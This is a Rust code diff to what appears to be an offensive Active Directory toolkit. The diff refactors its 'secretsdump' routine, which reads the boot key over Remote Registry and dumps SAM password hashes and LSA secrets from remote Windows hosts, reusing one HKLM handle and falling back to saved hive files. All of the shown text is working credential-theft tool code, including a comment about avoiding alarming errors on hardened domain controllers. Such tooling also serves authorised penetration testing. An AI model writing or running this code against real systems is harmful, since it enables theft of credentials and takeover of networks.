@@ -1319,31 +1319,51 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
             }
         };
         match reg.as_mut() {
-            Some(r) => match adhammer_secrets::bootkey_via_rrp(r).await {
-                Ok(bk) => {
-                    eprintln!(
-                        "[+] bootkey via RRP: {}",
-                        bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
-                    );
-                    // Try SAM+LSA via RRP too — no hive files at all if this works.
-                    // The BaseRegEnumKey wire marshaling still needs impacket-byte diff on
-                    // hardened DCs (nca_s_fault_ndr against some server builds), so we quietly
-                    // fall back to hives rather than panic operators with an alarming error.
-                    if let Ok(users) = adhammer_secrets::dump_sam_via_rrp(r, &bk).await {
-                        eprintln!("[+] SAM via RRP: {} account(s)", users.len());
-                        rrp_sam = Some(users);
+            Some(r) => {
+                // Open HKLM once and reuse it across all three RRP calls — saves 4 RPC
+                // roundtrips (2 opens + 2 closes) versus opening HKLM inside each helper.
+                match r.hklm().await {
+                    Ok(hklm) => {
+                        let bk_res =
+                            adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
+                        let bk_opt = match bk_res {
+                            Ok(bk) => {
+                                eprintln!(
+                                    "[+] bootkey via RRP: {}",
+                                    bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
+                                );
+                                if let Ok(users) =
+                                    adhammer_secrets::dump_sam_via_rrp_hklm(r, &hklm, &bk).await
+                                {
+                                    eprintln!("[+] SAM via RRP: {} account(s)", users.len());
+                                    rrp_sam = Some(users);
+                                }
+                                if let Ok(secrets) =
+                                    adhammer_secrets::dump_lsa_via_rrp_hklm(r, &hklm, &bk).await
+                                {
+                                    eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
+                                    rrp_lsa = Some(secrets);
+                                }
+                                Some(bk)
+                            }
+                            Err(e) => {
+                                eprintln!(
+                                    "[!] RRP bootkey failed ({e}) — falling back to `reg save` hives"
+                                );
+                                None
+                            }
+                        };
+                        r.close_handle(&hklm).await;
+                        bk_opt
                     }
-                    if let Ok(secrets) = adhammer_secrets::dump_lsa_via_rrp(r, &bk).await {
-                        eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
-                        rrp_lsa = Some(secrets);
+                    Err(e) => {
+                        eprintln!(
+                            "[!] RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
+                        );
+                        None
                     }
-                    Some(bk)
                 }
-                Err(e) => {
-                    eprintln!("[!] RRP bootkey failed ({e}) — falling back to `reg save` hives");
-                    None
-                }
-            },
+            }
             None => None,
         }
     };
